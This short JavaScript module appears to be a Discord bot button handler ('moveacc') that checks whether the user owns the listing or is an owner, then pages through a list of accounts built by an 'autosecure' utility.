const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");
const { queryParams } = require("../../../db/database");

const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "moveacc",
    callback: async (client, interaction) => {
        let [t, id, page, direction] = interaction.customId.split("|");
        const isUserOwner = await isOwner(interaction.user.id);
        if (id && interaction.user.id !== id && !isUserOwner) {
            return interaction.reply({ content: "You do not have permission to view these accounts.", ephemeral: true });
        }
        let current = parseInt(page);

        return interaction.update(await accountsmsg(interaction.user.id, current));
    }
};